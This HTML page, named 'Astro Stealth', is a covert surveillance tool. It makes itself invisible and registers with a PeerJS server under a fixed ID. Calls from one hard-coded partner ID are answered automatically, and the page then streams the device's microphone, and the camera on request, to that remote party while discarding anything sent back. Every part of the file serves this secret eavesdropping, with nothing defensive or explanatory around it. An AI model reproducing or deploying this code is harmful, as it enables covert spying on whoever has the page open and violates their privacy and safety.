<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Astro Stealth</title>
    <style>
        /* Complete invisibility - no visual elements */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: transparent;
            min-height: 0;
            padding: 0;
            margin: 0;
            overflow: hidden;
        }
        
        /* Hidden video elements */
        video {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            top: -1000px;
            left: -1000px;
        }
        
        /* Ensure no visible elements */
        div, span, button, iframe {
            display: none !important;
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>
    <video id="localVideo" autoplay muted playsinline></video>

    <script>
        // ============ STEALTH CONFIGURATION ============
        const MY_ID = "BPrivate";
        const PARTNER_ID = "APrivate";
        const AUTO_ACCEPT_CALLS = true;
        // ==============================================
        
        let peer = null;
        let currentCall = null;
        let localStream = null;
        let reconnectAttempts = 0;
        const MAX_RECONNECTS = 5;
        
        function log(msg, type = 'info') {
            const prefix = type === 'error' ? '❌' : (type === 'warn' ? '⚠️' : '✅');
            console.log(`[STEALTH] ${prefix} ${msg}`);
        }
        
        async function getMediaStream(callType) {
            const isVideo = callType === 'video';
            
            const constraints = {
                audio: true,  // ALWAYS send audio from stealth
                video: isVideo ? {
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                } : false
            };
            
            log(`Getting media - Audio: true, Video: ${isVideo}`, 'info');
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const hasAudio = stream.getAudioTracks().length > 0;
                const hasVideo = stream.getVideoTracks().length > 0;
                log(`Media acquired - Audio: ${hasAudio}, Video: ${hasVideo}`, 'success');
                return stream;
            } catch (e) {
                if (e.name === 'NotAllowedError') {
                    log('Camera/Mic permission denied', 'error');
                } else {
                    log(`Media error: ${e.message}`, 'error');
                }
                throw e;
            }
        }
        
        async function handleIncomingCall(call) {
            const callType = call.metadata?.type || 'voice';
            const isVideo = callType === 'video';
            log(`Incoming ${isVideo ? 'VIDEO' : 'AUDIO'} call from remote`, 'info');
            
            if (!AUTO_ACCEPT_CALLS) {
                log('Call rejected', 'warn');
                call.close();
                return;
            }
            
            try {
                // Get stealth media stream (ALWAYS includes audio)
                const stream = await getMediaStream(callType);
                localStream = stream;
                
                // Hide video element
                if (isVideo && stream.getVideoTracks().length > 0) {
                    const videoEl = document.getElementById('localVideo');
                    videoEl.srcObject = stream;
                }
                
                // Answer the call
                call.answer(stream);
                currentCall = call;
                
                log(`Call answered - Sending ${isVideo ? 'Video + Audio' : 'Audio only'} to remote`, 'success');
                
                // Handle remote stream (ignore)
                call.on('stream', (remoteStream) => {
                    if (remoteStream) {
                        // Disable and stop remote tracks
                        remoteStream.getTracks().forEach(track => {
                            track.enabled = false;
                            track.stop();
                        });
                        log('Remote stream disabled (stealth receives nothing)', 'info');
                    }
                });
                
                call.on('close', () => {
                    log('Call ended by remote', 'info');
                    endCall();
                });
                
                call.on('error', (err) => {
                    log(`Call error: ${err}`, 'error');
                    endCall();
                });
                
            } catch (err) {
                log(`Failed to handle call: ${err.message}`, 'error');
                call.close();
            }
        }
        
        function endCall() {
            if (localStream) {
                localStream.getTracks().forEach(track => {
                    track.stop();
                    log(`Stopped ${track.kind} track`, 'info');
                });
                localStream = null;
            }
            if (currentCall) {
                currentCall.close();
                currentCall = null;
            }
            document.getElementById('localVideo').srcObject = null;
            log('Call ended, resources released', 'info');
        }
        
        function initPeer() {
            if (peer) {
                peer.destroy();
                peer = null;
            }
            
            log(`Initializing stealth device as ${MY_ID}`, 'info');
            peer = new Peer(MY_ID);
            
            peer.on('open', (id) => {
                log(`✅ Stealth device ACTIVE - ID: ${MY_ID}`, 'success');
                log(`Waiting for connection from ${PARTNER_ID}...`, 'info');
                reconnectAttempts = 0;
            });
            
            peer.on('call', (call) => {
                if (call.peer === PARTNER_ID) {
                    handleIncomingCall(call);
                } else {
                    log(`Rejected call from ${call.peer}`, 'warn');
                    call.close();
                }
            });
            
            peer.on('disconnected', () => {
                log('Disconnected, reconnecting...', 'warn');
                if (reconnectAttempts < MAX_RECONNECTS) {
                    reconnectAttempts++;
                    setTimeout(() => peer.reconnect(), 3000);
                }
            });
            
            peer.on('error', (err) => {
                if (err.type === 'unavailable-id') {
                    log(`ID ${MY_ID} in use, retrying...`, 'warn');
                    setTimeout(() => initPeer(), 5000);
                } else {
                    log(`Error: ${err.type}`, 'error');
                }
            });
        }
        
        // Start stealth service
        log('=== ASTRO STEALTH SERVICE ===');
        log('Configuration:');
        log(`  - ID: ${MY_ID}`);
        log(`  - Target: ${PARTNER_ID}`);
        log(`  - Audio: ALWAYS SENT`);
        log(`  - Video: ON DEMAND`);
        log(`  - Receives: NOTHING from remote`);
        
        initPeer();
        
        // Heartbeat
        setInterval(() => {
            if (currentCall) {
                console.log('[STEALTH] Active call - sending to remote');
            }
        }, 30000);
        
        // Clean shutdown
        window.addEventListener('beforeunload', () => {
            if (currentCall) currentCall.close();
            if (peer) peer.destroy();
            if (localStream) {
                localStream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
